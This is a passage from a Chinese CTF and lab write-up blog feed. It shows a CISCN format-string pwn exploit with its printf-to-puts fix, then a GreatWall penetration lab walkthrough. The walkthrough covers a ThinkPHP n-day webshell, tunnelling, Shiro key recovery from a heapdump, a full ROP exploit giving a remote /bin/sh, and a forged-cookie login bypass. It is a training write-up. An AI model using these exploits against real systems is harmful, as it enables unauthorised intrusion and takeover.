class="hljs-string">&#x27;bp $rebase(0x1635)&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;gift:&#x27;</span>)<br>    stack=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>    print_stack=stack-<span class="hljs-number">0x18</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(print_stack))<br>    payload=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">14</span><br>    payload+=<span class="hljs-string">&quot;%p&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(print_stack-<span class="hljs-number">14</span>-<span class="hljs-number">14</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br>    data=<span class="hljs-number">0xa9</span><br>    subdata=(print_stack+<span class="hljs-number">26</span>)&amp;<span class="hljs-number">0xff</span><br>    data=data+<span class="hljs-number">0x100</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">26</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hhn&quot;</span><br><span class="hljs-comment">#    p.sendline(&#x27;%p &#x27;*80)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name?&#x27;</span>,payload)<br>    p.readuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>    libc.address=<span class="hljs-built_in">int</span>(p.read(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x270b3</span><br>    gadget=libc.address+gadget <span class="hljs-comment">#3601</span><br>    <span class="hljs-comment">#libc.address=int(p.read(12),16)-0x24083</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-comment">#    p.sendline(&#x27;%p &#x27;*60)</span><br><span class="hljs-comment">#    p.interactive()</span><br>    print_stack=print_stack-<span class="hljs-number">0x30</span><br><br><br>    data=print_stack-<span class="hljs-number">0x30</span><br>    payload=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data-<span class="hljs-number">8</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br><br>    data=print_stack<br>    subdata=print_stack-<span class="hljs-number">0x30</span>+<span class="hljs-number">11</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">11</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br><br><br>    data=print_stack+<span class="hljs-number">4</span>-<span class="hljs-number">0x30</span><br>    subdata=(print_stack+<span class="hljs-number">14</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">10</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br>    <br>    data=<span class="hljs-number">0xa9</span><br>    subdata=(print_stack+<span class="hljs-number">4</span>+<span class="hljs-number">10</span>-<span class="hljs-number">0x30</span>)&amp;<span class="hljs-number">0xff</span><br>    data=data+<span class="hljs-number">0x100</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">10</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hhn&#x27;</span><br>    <br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(print_stack))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>    p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>    pause()<br><br>    print_stack-=<span class="hljs-number">0x30</span><br>    data=gadget&amp;<span class="hljs-number">0xffff</span><br>    subdata=<span class="hljs-number">20</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=print_stack+<span class="hljs-number">2</span><br>    subdata=(gadget+<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=(gadget&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br>    subdata=(print_stack+<span class="hljs-number">2</span>+<span class="hljs-number">26</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br><br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">26</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=(gadget&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span><br>    subdata=(gadget&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    info(<span class="hljs-string">&quot;thrid&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>    p.interactive()<br><span class="hljs-comment">#    pause()</span><br><br>p=process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>pwn(p)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p=remote(&quot;10.1.123.23&quot;,9999)</span><br>        p=process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>        gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1635)&#x27;</span>)<br>        pwn(p)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="fix-7"><a href="#fix-7" class="headerlink" title="fix"></a>fix</h2><p>在输出时使用了printf函数，修改为使用puts函数进行输出</p><p><img src="/img/wp/2024/2024ciscn-printf-master-FIX_1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1签到+4web+4pwn&lt;/p&gt;
&lt;h1 id=&quot;web-welcome&quot;&gt;&lt;a href=&quot;#web-welcome&quot; class=&quot;headerlink&quot; title=&quot;web-welcome&quot;&gt;&lt;/a&gt;web-welcome&lt;/h1&gt;&lt;p&gt;签到，Ctrl+U&lt;/p&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.dr0n.top/tags/ciscn/"/>
    
    <category term="awdp" scheme="https://www.dr0n.top/tags/awdp/"/>
    
    <category term="2024" scheme="https://www.dr0n.top/tags/2024/"/>
    
  </entry>
  
  <entry>
    <title>春秋云境 GreatWall(第一届长城杯半决赛渗透题)</title>
    <link href="https://www.dr0n.top/posts/f249db01/"/>
    <id>https://www.dr0n.top/posts/f249db01/</id>
    <published>2024-06-10T12:00:00.000Z</published>
    <updated>2024-06-12T12:18:16.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-172-28-23-17"><a href="#ThinkPHP-172-28-23-17" class="headerlink" title="ThinkPHP (172.28.23.17)"></a>ThinkPHP (172.28.23.17)</h1><p>先扫描端口，发现开放了两个web服务</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-1.png"></p><p>8080是一个后台登录框，版本是<code>ThinkPHP V5.0.23</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-2.png"></p><p>直接用tp5的nday打</p><p>写入shell后根目录有<code>flag1</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-3.png"></p><p>然后上传fscan开始扫内网</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:04:4a:03 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0<br>       valid_lft 315357428sec preferred_lft 315357428sec<br>    inet6 fe80::216:3eff:fe04:4a03/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>发现存活主机如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.28.23.26</span><br><span class="hljs-number">172.28.23.33</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-4.png"></p><h1 id="第一层内网"><a href="#第一层内网" class="headerlink" title="第一层内网"></a>第一层内网</h1><h2 id="建立代理"><a href="#建立代理" class="headerlink" title="建立代理"></a>建立代理</h2><p>通过Neo-reGeorg上传一个tunnel.php</p><p>然后本地建立连接，转发到本地的6666端口</p><p><code>python neoreg.py -k dr0n1 -p 6666 -u http://8.130.36.152:8080/tunnel.php</code></p><p>然后使用proxifier或者SwitchyOmega等代理</p><h2 id="智联科技-ERP-172-28-23-33"><a href="#智联科技-ERP-172-28-23-33" class="headerlink" title="智联科技 ERP (172.28.23.33)"></a>智联科技 ERP (172.28.23.33)</h2><p>开放了8080端口，访问是 智联科技 ERP 后台登陆</p><p>扫下目录</p><p><code>python dirsearch.py -u http://172.28.23.33:8080/ --proxy socks5://127.0.0.1:6666</code></p><p>显然是Shiro框架+heapdump泄露</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-5.png"></p><p>使用<code>JDumpSpider</code>分析heapdump，拿到ShiroKey</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">===========================================<br>CookieRememberMeManager(ShiroKey)<br>-------------<br>algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES<br><br>===========================================<br></code></pre></td></tr></table></figure><p>注入内存马后连接shell</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-6.png"></p><p>没找到flag，用户是ops01，应该是要提权</p><p>在&#x2F;home&#x2F;ops01&#x2F;中有HashNote文件，开放了59696端口</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-24.png"></p><p>分析HashNote文件</p><p>首先调用了<code>sub_40501E()</code>进行身份验证，密码为<code>freep@ssw0rd:3</code></p><p>选项1调用了<code>sub_404924()</code></p><p>输入key后调用了<code>sub_40482C()</code>，生成hash作为索引，返回的范围是0-126</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-26.png"></p><p>因为在重复判断时没有对索引进行验证，存在数组越界</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-25.png"></p><p>选项2调用了<code>sub_404B7A()</code></p><p>与1同样，没有对索引验证，可以构造data，实现任意地址读</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-27.png"></p><p>选项3调用了<code>sub_404D2D()</code></p><p>与2一样，输出变成了写入，可以任意地址写</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-28.png"></p><p>因为username的地址在数组之后，所以越界后数组可以索引到username</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-29.png"></p><p>先构造两个同样hash不同key的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">key,data=<span class="hljs-string">&#x27;b&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">1</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后再username中伪造数据，获取栈的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">username=<span class="hljs-number">0x5dc980</span><br>stack=<span class="hljs-number">0x5e4fa8</span><br>ukey=<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x10</span>:[username+<span class="hljs-number">0x20</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>:[stack,<span class="hljs-number">0x10</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到地址后就可以向栈中写入rop链</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">key,data=<span class="hljs-string">&#x27;b&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Key: &quot;</span>,key);<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">key,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">username</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,username)<br><br><br>p = remote(<span class="hljs-string">&#x27;172.28.23.33&#x27;</span>, <span class="hljs-number">59696</span>)<br><span class="hljs-comment"># p = process(&#x27;./HashNote&#x27;)</span><br><br><br>username=<span class="hljs-number">0x5dc980</span><br>stack=<span class="hljs-number">0x5e4fa8</span><br>ukey=<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x10</span>:[username+<span class="hljs-number">0x20</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>:[stack,<span class="hljs-number">0x10</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,fake_chunk)<br>p.sendlineafter(<span class="hljs-string">b&#x27;word&#x27;</span>,<span class="hljs-string">&#x27;freep@ssw0rd:3&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">1</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 126</span><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 127</span><br><br><br>show(ukey)<br>main_ret=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1e0</span><br><br><br><br><br>rdi=<span class="hljs-number">0x0000000000405e7c</span> <span class="hljs-comment"># pop rdi ; ret</span><br>rsi=<span class="hljs-number">0x000000000040974f</span> <span class="hljs-comment"># pop rsi ; ret</span><br>rdx=<span class="hljs-number">0x000000000053514b</span> <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>rax=<span class="hljs-number">0x00000000004206ba</span> <span class="hljs-comment"># pop rax ; ret</span><br>syscall=<span class="hljs-number">0x00000000004560c6</span> <span class="hljs-comment"># syscall</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0x20</span>:[username+<span class="hljs-number">0x30</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>:[main_ret,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>name(fake_chunk.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>payload=flat([<br>    rdi,username+<span class="hljs-number">0x50</span>,<br>    rsi,<span class="hljs-number">0</span>,<br>    rdx,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    rax,<span class="hljs-number">0x3b</span>,<br>    syscall<br>    ])<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,ukey)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;9&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>在<code>/root/flag_RaYz1/f1ag03.txt</code>拿到flag3</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-7.png"></p><p>有两张网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:03:cb:48 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0<br>       valid_lft 315357178sec preferred_lft 315357178sec<br>    inet6 fe80::216:3eff:fe03:cb48/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:03:97:b8 brd ff:ff:ff:ff:ff:ff<br>    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe03:97b8/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>将fscan传到172.28.23.17后wget下载</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-22.png"></p><p>172.22.10.1&#x2F;24 网段存活如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.10.28</span><br></code></pre></td></tr></table></figure><h2 id="新翔OA-172-28-23-26"><a href="#新翔OA-172-28-23-26" class="headerlink" title="新翔OA (172.28.23.26)"></a>新翔OA (172.28.23.26)</h2><p>在之前的扫描结果中看到开放了21端口，匿名用户可以登录</p><p>下载oa源码</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-8.png"></p><p>开始审计代码</p><p>从<code>main.php</code>开始，开头引入了<code>db.php</code>和<code>checklogin.php</code></p><p>抽象的鉴权</p><p>checklogin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">islogin</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;loginname&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;jueseid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;danweiid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;quanxian&#x27;</span>]))&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;id&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;loginname&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;jueseid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;danweiid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;quanxian&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>     &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1</code> 直接登录</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-9.png"></p><p>登进去后好像没什么用，后台写的很简陋，没有功能点</p><p>在源码根目录下还有一个<code>uploadbase64.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 